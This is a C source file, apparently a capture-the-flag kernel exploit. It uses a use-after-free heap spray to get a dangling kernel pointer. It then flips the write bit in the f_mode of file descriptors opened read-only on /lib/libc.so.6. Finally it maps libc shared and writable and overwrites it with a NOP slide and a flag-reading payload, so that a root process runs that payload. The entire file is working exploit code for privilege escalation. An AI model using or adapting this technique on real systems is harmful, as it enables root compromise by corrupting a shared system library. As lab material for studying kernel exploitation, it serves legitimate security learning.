#include "libs/fmode.h"
#include "libs/pwn.h"
#include "libs/readflag.h"

#include <dirent.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <sys/types.h>
#include <unistd.h>

/*******************************
 * BUSY HIJACK                 *
 *******************************/

#define FILE_SIZE 0x100
#define NOP_SLIDE_SIZE 0x50000

#define SPRAY_VULN 0x1000
#define SPRAY_VICT 0xc00
#define OFFSET 0x8c
#define OFFSET_IDX (OFFSET / sizeof(u32))

int main(int argc, char *argv[]) {
  void *keap_ptr;
  u32 leak[FILE_SIZE / sizeof(u32)] = {0};
  char clear[FILE_SIZE] = {0};

  lstage("INIT");

  rlimit_increase(RLIMIT_NOFILE);
  pin_cpu(0, 0);
  init();

  linfo("created dangeling ptrs");

  void *keap_ptrs[SPRAY_VULN] = {0};
  for (int i = 0; i < SPRAY_VULN; i++)
    keap_ptrs[i] = keap_malloc(FILE_SIZE, GFP_KERNEL_ACCOUNT);

  for (int i = 0; i < SPRAY_VULN; i++) {
    keap_free(keap_ptrs[i]);
    if (i == SPRAY_VULN / 2)
      keap_ptr = keap_ptrs[i];
  }

  linfo("dangeling ptr: %p", keap_ptr);

  int vict_fds[SPRAY_VICT];
  for (int i = 0; i < SPRAY_VICT; i++)
    vict_fds[i] = SYSCHK(open("/lib/libc.so.6", O_RDONLY));

  keap_read(keap_ptr, leak, FILE_SIZE);

#ifdef DEBUG
  print_hex((char *)leak, FILE_SIZE);
#endif

  int idx = -1;

  linfo("find fmode");
  for (int i = 0; i < FILE_SIZE / sizeof(u32); i++) {
    if ((leak[i] & 0xff) ==
        (FMODE_READ | FMODE_LSEEK | FMODE_PREAD | FMODE_PWRITE)) {
      idx = i;
      break;
    }
  }

  if (idx == -1)
    lerror("failed to find fmode");

  linfo("corrupt /lib/libc.so.6 to make O_RDWR");
  // is predictable, but this increases compatibility
  linfo("old fmode: 0x%4x", leak[idx]);
  leak[idx] |= FMODE_WRITE;
  linfo("new fmode: 0x%4x", leak[idx]);

  keap_write(keap_ptr + idx * sizeof(u32), leak + idx, 1);

  for (int i = 0; i < SPRAY_VICT; i++) {
    // mmap doesn't check if FMODE_CAN_WRITE is set
    void *libc_map = mmap(0, NOP_SLIDE_SIZE + sizeof(readflag),
                          PROT_WRITE | PROT_READ, MAP_SHARED, vict_fds[i], 0);

    if (libc_map == MAP_FAILED)
      continue;

    memset(libc_map, '\x90', NOP_SLIDE_SIZE);
    memcpy(libc_map + NOP_SLIDE_SIZE, readflag, sizeof(readflag));

    // leave into hijacked root process
    lstage("read flag:");
    return 0;
  }
  lerror("failed");
  return 1;
}
